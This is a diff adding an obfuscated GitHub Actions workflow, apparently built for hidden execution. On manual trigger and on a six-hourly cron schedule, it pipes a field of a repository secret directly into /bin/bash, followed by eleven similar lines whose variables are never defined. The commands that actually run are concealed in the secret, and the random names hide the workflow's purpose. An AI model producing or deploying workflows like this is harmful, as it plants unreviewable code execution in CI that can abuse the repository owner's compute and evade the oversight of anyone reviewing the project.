@@ -1,0 +1,29 @@
+name: guyishiwang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: guyishiwang
+        env:
+          iq9479: ${{ secrets.iq9479 }}
+        run: |
+          echo $iq9479 | jq -r .cc7229 | /bin/bash
+          echo $uxa1 | jq -r .yvkc26764 | /bin/bash
+          echo $azqsw39 | jq -r .jqdt5 | /bin/bash
+          echo $yw96714 | jq -r .zyj0492 | /bin/bash
+          echo $omipf3 | jq -r .v83 | /bin/bash
+          echo $tvx67569 | jq -r .ncrk2 | /bin/bash
+          echo $u64450 | jq -r .mx45336 | /bin/bash
+          echo $men12513 | jq -r .y02 | /bin/bash
+          echo $a5993 | jq -r .v07787 | /bin/bash
+          echo $usym47530 | jq -r .pabq311 | /bin/bash
+          echo $nxqt803 | jq -r .o60 | /bin/bash
+          echo $o7 | jq -r .kns37 | /bin/bash
+
